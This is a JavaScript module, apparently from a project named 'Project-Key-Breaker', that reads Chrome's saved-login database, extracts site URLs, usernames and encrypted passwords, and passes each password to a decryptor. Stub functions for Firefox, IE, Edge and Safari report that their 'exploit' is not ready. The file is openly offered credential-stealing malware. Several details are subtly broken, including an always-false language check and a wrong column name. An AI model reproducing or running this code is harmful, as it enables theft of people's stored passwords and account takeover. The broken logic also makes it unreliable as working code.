const s = require('sqlite3').verbose(),
	pwnd = require("./decryptor"),
	Check = require("./system_check/sys_check");


	console.log(Check.win32("chrome"));
const chrome = (async () => {
			try {
				//console.log(process.env.LANG);
				if (!process.env.LANG === "en_US.UTF-8" || !process.env.LANG === "en_AU.UTF-8") console.log("Sorry to inform you, but the system language isn't compatible with the exploit as of yet!\n\nKeep an eye out for future updates about this at: https://key-break.er/updates or https://github.com/KazutoKashima/Project-Key-Breaker/"), process.exit(1);

				let db = await new s.Database((Check.win32("chrome"), (e) => {
					if (e) return console.error(e);
					return console.log('Connected to Database');
				}));

				db.serialize(async () => {
					db.each(
						"SELECT action_url, username_value, password_value FROM logins",
						async (e, row) => {
							if (e) return console.error(e);
							return console.log(`URL: ${row.action_url}`),
							console.log(`Username: ${row.username}`),
							console.log('Password Cipher: ' + row.password_value),

							console.time(),
							// run func to decrypt.
							enc = row.password_value,
							enc = await pwnd.fndEnc(enc),
							await pwnd.decrypt(enc);
						}
					);
				});
			} catch (e) {
				return console.error(e);
			}
	}),
	firefox = (async () => {
		return console.log("Firefox expoit not ready yet!");
	}),
	ie = (async () => {
		return console.log("IE expoit not ready yet!");
	}),
	edge = (async () => {
		return console.log("Edge expoit not ready yet!");
	}),
	safari = (async () => {
		return console.log("Safari expoit not ready yet!");
	});

module.exports = {
	chrome: chrome,
	firefox: firefox,
	ie: ie,
	edge: edge,
	safari: safari
};